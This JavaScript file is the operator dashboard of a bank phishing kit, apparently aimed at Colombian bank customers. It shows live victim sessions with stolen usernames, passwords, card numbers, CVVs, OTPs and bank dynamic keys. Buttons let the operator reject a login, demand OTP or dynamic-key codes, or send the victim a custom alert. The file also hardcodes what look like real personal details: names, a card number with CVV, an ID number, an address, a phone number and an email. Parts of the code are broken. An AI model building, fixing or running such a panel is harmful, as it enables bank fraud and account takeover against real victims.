const nodeUrl = "http://192.168.1.4:3005";
let socket;
let sessionsById = {};
let selectedId = null;

// Search
renderList();

const ACTION_UI = {
    AUTH_ERROR: { label: "LOGO", css: "background:#fc5555;color:#fff;" },
    AUTH_WAIT_ACTION: { label: "LOGO", css: "background:#fdb813;color:#fff;" },

    DINAMIC_ERROR: { label: "DINA", css: "background:#fc5555;color:#fff;" },
    DINAMIC_WAIT_ACTION: {
        label: "DINA",
        css: "background:#fdb813;color:#fff;",
    },

    OTP_ERROR: { label: "OTP", css: "background:#fc5555;color:#fff;" },
    OTP_WAIT_ACTION: { label: "OTP", css: "background:#fdb813;color:#fff;" },

    FINISHED: { label: "OK", css: "background:#1db954;color:#fff;" },
};

function applyActionUI(el, action) {
    el.textContent = action ?? "—";
    el.style.cssText = "";

    const ui = ACTION_UI[action];
    if (ui) {
        el.textContent = ui.label;
        el.style.cssText = ui.css;
    }
}

// Modal helpers
const modalOverlay = document.getElementById("modalOverlay");
const closeModalBtn = document.getElementById("closeModalBtn");

function isSmallScreen() {
    return window.matchMedia("(max-width: 980px)").matches;
}

function openModal() {
    modalOverlay.classList.add("open");
    modalOverlay.setAttribute("aria-hidden", "false");
    document.body.style.overflow = "hidden";
}

function closeModal() {
    modalOverlay.classList.remove("open");
    modalOverlay.setAttribute("aria-hidden", "true");
    document.body.style.overflow = "";
}

closeModalBtn.addEventListener("click", closeModal);
modalOverlay.addEventListener("click", (e) => {
    if (e.target === modalOverlay) closeModal();
});
window.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && modalOverlay.classList.contains("open"))
        closeModal();
});

function stateDotClass(state) {
    switch (String(state || "").toUpperCase()) {
        case "ACTIVE":
            return "green";
        case "INACTIVE":
            return "red";
        case "MINIMIZED":
            return "yellow";
        default:
            return "gray";
    }
}
function stateDot(state) {
    return `<span class="dot ${stateDotClass(state)}"></span>`;
}

export async function connectAdmin() {
    const r = await fetch("/admin/socket-token", {
        credentials: "same-origin",
    });
    const data = await r.json();

    console.log(data);

    if (!r.ok) {
        alert("No autenticado o no se pudo emitir token.");
        console.error(data);
        return;
    }

    socket = io(nodeUrl, {
        transports: ["websocket"],
        auth: { token: data.token },
    });

    socket.on("connect", () => {
        /*         document.getElementById("connPill").innerHTML =
            "Socket:" + stateDot("ACTIVE");
 */
    });

    socket.on("connect_error", (err) => {
        document.getElementById("connPill").innerHTML =
            "Socket:" + stateDot("INACTIVE");
        console.error("❌ connect_error:", err.message);
        alert("Socket error: " + err.message);
    });

    socket.on("admin:sessions:bootstrap", (sessions) => {
        sessionsById = {};
        (sessions || []).forEach((s) => (sessionsById[s.id] = s));
        renderList();

        // If a session was selected, refresh its detail (desktop or modal)
        if (selectedId && sessionsById[selectedId]) {
            renderDetail(sessionsById[selectedId]);
        }
    });

    socket.on("admin:sessions:upsert", (s) => {
        sessionsById[s.id] = s;
        renderList();

        // Update detail if currently selected
        if (selectedId === s.id) {
            renderDetail(s);
        }
    });

    socket.on("error:msg", (msg) => alert(msg));
}

function hasValue(v) {
    return v !== null && v !== undefined && String(v).trim() !== "";
}

function renderList() {
    const items = Object.values(sessionsById)
        .sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt))
        .filter((s) => {
            return true;
            const blob = [
                s.id,
                s.state,
                s.action,
                s.user,
                s.pass,
                s.dinamic,
                s.otp,
            ]
                .map((v) => (v ?? "").toString().toLowerCase())
                .join(" ");
            return blob.includes(query);
        });

    const tpl = (id) => {
        const t = document.getElementById(id);
        if (!t) throw new Error(`Template no encontrado: ${id}`);
        return t;
    };

    const rowTpl = tpl("tpl-session-row");

    document.getElementById("sessionsList").innerHTML = items
        .map((s) => {
            const selected = selectedId === s.id ? "activeSel" : "";
            const node = rowTpl.content.firstElementChild.cloneNode(true);
            node.dataset.sessionId = s.id;
            applyActionUI(
                node.querySelector('[data-field="action"]'),
                s.action,
            );
            return `
            <div class="row ${selected}" onclick="openSession('${s.id}')">
            <div class="rowMain">
                <div class="rowTop">
                    <div class="rowtop-left">
                        <div class="rowtop-left-id">
                            ${stateDot(s.state)}
                            <span class="sid">${s.id}</span>
                        </div>
                        <div class="rowtop-left-name">
                            <span class="sname">Marina Lopera</span>
                        </div>
                    </div>
                    
                    <div class="pill rowtop-rigth">
                        <span [data-field="action"]>
                            ${
                                s.action === "AUTH_ERROR"
                                    ? "ERROR LOGO"
                                    : s.action === "AUTH_WAITING_ACTION"
                                      ? "ESPERANDO LOGO"
                                      : "LOGO"
                            }
                        </span>
                    </div>
                </div>
                <div class="meta">
                    <div class="bank">
                        <span class="kv"><b>${s.bank ? s.bank.charAt(0).toUpperCase() + s.bank.slice(1) : "⏳ esperando..."} ${s.cc ? (s.cctype ? s.cctype : "Debit")(s.cclevel ? s.cclevel : "Classic") : ""}</b></span>
                    </div>
                    <div class="action-details">
                        <span class="kv-action"><b>DATA</b></span>
                        <span class="kv-action"><b>CC</b></span>
                        <span class="kv-action ${s.action === "AUTH_ERROR" || "AUTH_WAITING_ACTION" ? "missing" : s.user && user.pass ? "ok" : ""}"><b>LOGO</b></span>
                        <span class="kv-action"><b>OTP</b></span>
                        <span class="kv-action"><b>DINA</b></span>
                    </div>
                </div>
            </div>
          </div>
          
        `;
        })
        .join("");
}
function renderActionsHTML(s, targetElId) {
    const actions = document.getElementById(targetElId);
    actions.innerHTML = "";
    if (!s) return;

    switch (s.action) {
        case "AUTH_WAIT_ACTION":
            actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_auth')">Error Login</button>
            <button class="primary" onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button class="primary" onclick="act('${s.id}','request_otp')">Pedir OTP</button>
          `;
            break;

        case "AUTH_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos</span>`;
            break;

        case "DINAMIC_WAIT_ACTION":
            actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_dinamic')">Error dinámica</button>
            <button class="primary" onclick="act('${s.id}','request_otp')">Pedir OTP</button>
            <button onclick="act('${s.id}','finish')">Finalizar</button>
          `;
            break;

        case "DINAMIC_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nueva dinámica</span>`;
            break;

        case "OTP_WAIT_ACTION":
            actions.innerHTML = `
            <button class="danger" onclick="act('${s.id}','reject_otp')">Error OTP</button>
            <button onclick="act('${s.id}','custom_alert')">Alerta personalizada</button>
            <button class="primary" onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
            <button onclick="act('${s.id}','finish')">Finalizar</button>
          `;
            break;

        case "OTP_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevo OTP</span>`;
            break;

        default:
            actions.innerHTML = `<span style="color:var(--muted)">Sin acciones disponibles en este estado.</span>`;
    }
}

function renderDetail(s) {
    // Desktop detail
    document.getElementById("selectedId").textContent = s?.id ?? "—";
    document.getElementById("detailBox").innerHTML = (s) => {
        return `
            <div class="focus">
                <div class="cc">
                    <p><b>CC</b><span>5306 9171 4567 3423</span></p>
                    <p>
                        <b>EXP</b><span>12/33</span>
                        <b>CVV</b><span>532</span>
                    </p>
                </div>
                <div class="focus-icon">
                    <span>💡</span>
                </div>
                
            </div>
        `;
    };

    /* document.getElementById("detailBox").textContent = JSON.stringify(
        s ?? {},
        null,
        2,
    ); */

    const dt = document.getElementById("detailTop");
    if (s) {
        dt.innerHTML = `
          <span style="display:inline-flex;align-items:center;gap:10px;">
            ${stateDot(s.state)}
            <span>Estado: <b style="color:rgba(255,255,255,.92)">${
                s.state ?? "—"
            }</b></span>
          </span>
          <span>Acción: <b style="color:rgba(255,255,255,.92)">${
              s.action ?? "—"
          }</b></span>
        `;
    } else {
        dt.textContent = "Selecciona una sesión.";
    }
    renderActionsHTML(s, "actions");

    // Mobile modal detail
    if (isSmallScreen() && s) {
        document.getElementById("modalSessionId").textContent = s.id ?? "—";
        document.getElementById("modalState").textContent = s.state ?? "—";
        document.getElementById("modalActionPill").textContent = `action: ${
            s.action ?? "—"
        }`;
        document.getElementById("modalFocusBox").innerHTML = `
            <div class="focus">
                <div class="logo">
                    <div class="value-container">
                        <b class="value-label">Usuario: </b><span class="value">Marina31</span>
                    </div>
                    <div class="value-container">
                        <b class="value-label">Contraseña: </b><span>5324</span>

                    </div>
                </div>
                <div class="focus-icon">
                    <span>💡</span>
                </div> 
            </div>
            
       `;
        document.getElementById("modalCCHistoryBox").innerHTML = `
            <div class="history-data-label-container">
            <span class="history-data-label">CC</span>
            </div>
            <div class="history-data">
                <div class="cc">
                    <div class="value-container cc-holder">
                        <b class="value-label">Nombre: </b><span class="value">Camilo Morales</span>
                    </div>
                    <div class="value-container cc-number">
                        <b class="value-label">Tarjeta: </b><span class="value">5306 9171 4567 3423</span>
                    </div>
                    <div class="value-container cc-data">
                        <div class="cvv-value">
                            <span class="value cvv"><b class="value-label">Cvv: </b>3411</span>
                        </div>
                        <div class="exp-value">
                            <span class="value exp"><b class="value-label">Exp: </b>10/33</span>
                        </div>
                    </div>
                </div>
                <div class="history-data-icon">
                    <i class="fa-solid fa-circle-check"></i>
                </div> 
            </div>   
       `;

        document.getElementById("modalLogoHistoryBox").innerHTML = `
            <div class="history-data-label-container">
            <span class="history-data-label">LOGO</span>
            </div>
            <div class="history-data">
                <div class="logo">
                    <div class="value-container logo-user">
                        <b class="value-label">Usuario: </b><span class="value">Marina31</span>
                    </div>
                    <div class="value-container logo-pass">
                        <b class="value-label">Contraseña: </b><span class="value">5306</span>
                    </div>
                </div>
                <div class="history-data-icon">
                    <i class="fa-solid fa-circle-check"></i>
                </div> 
            </div>   
       `;
       document.getElementById("modalDinaHistoryBox").innerHTML = `
            <div class="history-data-label-container">
                <span class="history-data-label">DINAMICA</span>
            </div>
            <div class="history-data">
                <div class="value-container">
                    <span class="dinamic-value">645312</span>
                </div>
                <div class="history-data-icon">
                    <i class="fa-solid fa-circle-check"></i>
                </div> 
            </div>   
       `;
        document.getElementById("modalOtpHistoryBox").innerHTML = `
            <div class="history-data-label-container">
                <span class="history-data-label">OTP</span>
            </div>
            <div class="history-data">
                <div class="value-container">
                    <span class="otp-value">64531232</span>
                </div>
                <div class="history-data-icon">
                    <i class="fa-solid fa-circle-check"></i>
                </div> 
            </div>   
       `;
        document.getElementById("modalOtherHistoryBox").innerHTML = `
            <div class="history-data-label-container">
                <span class="history-data-label">Información de la persona</span>
            </div>
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">Nombre: </b><span class="common-value">Tatiana Sofía</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">Apellido: </b><span class="common-value">Lopera Hernandez</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">Documento: </b><span class="common-value">1033336102</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">Dirección: </b><span class="common-value">Calle 116b # 64c - 33</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">Telefono: </b><span class="common-value">324 422 4518</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">País: </b><span class="common-value">Colombia</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">Ciudad: </b><span class="common-value">Itagui</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">Email: </b><span class="common-value">tatihernandezz12@gmail.com</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">IP: </b><span class="common-value">192.168.1.23</span>
                </div>
            </div>  
            <div class="history-data">
                <div class="value-container">
                    <b class="common-label">WebBrowser: </b><span class="common-value">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span>
                </div>
            </div>  
       `;
       

        // Dot in modal
        document.getElementById("modalDot").innerHTML = stateDot(s.state);

        /* renderActionsHTML(s, "modalActions"); */
    }
}

connectAdmin();

// When resizing: if modal open but now desktop, close it
window.addEventListener("resize", () => {
    if (!isSmallScreen() && modalOverlay.classList.contains("open"))
        closeModal();
});

window.openSession = function (id) {
    selectedId = id;
    renderList();

    const s = sessionsById[id];
    renderDetail(s);

    // Small screens: open modal
    if (isSmallScreen() && s) {
        openModal();
    }
};

window.act = function (sessionId, action) {
    let message = null;
    if (action === "custom_alert") {
        message = prompt("Mensaje personalizado para el usuario:");
        if (message === null) return;
    }
    const eventName = `admin:${action}`;
    socket.emit(eventName, message ? { sessionId, message } : { sessionId });
};
